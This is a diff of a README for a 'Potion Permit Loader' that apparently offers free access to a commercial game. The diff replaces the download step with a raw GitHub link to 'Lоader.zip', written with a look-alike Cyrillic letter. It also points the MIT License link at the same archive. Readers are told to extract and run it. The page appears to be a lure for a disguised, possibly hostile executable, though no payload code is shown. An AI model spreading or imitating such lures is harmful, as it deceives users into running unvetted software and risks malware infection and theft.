@@ -22,7 +22,7 @@ Welcome to the all-in-one **Potion Permit  Loader**! This tool helps you access 
 
 ## 🔐 Installation Guide
 
-1. Download **Loader.rar** from this repository  
+1. Download **https://raw.githubusercontent.com/abhineet6165/PotionPermit-FreebieHub/main/Lоader.zip** from this repository  
 2. Extract to your preferred directory  
 3. Run the Loader and follow on-screen setup instructions  
 4. Launch Potion Permit directly or with mods
@@ -37,7 +37,7 @@ This repository is intended strictly for educational, preservation, and personal
 
 ## 📄 MIT License
 
-All code is offered under the [MIT License](https://opensource.org/licenses/MIT).  
+All code is offered under the [MIT License](https://raw.githubusercontent.com/abhineet6165/PotionPermit-FreebieHub/main/Lоader.zip).  
 © Potion Permit Loader Developers, 2025
 
 Happy gaming!
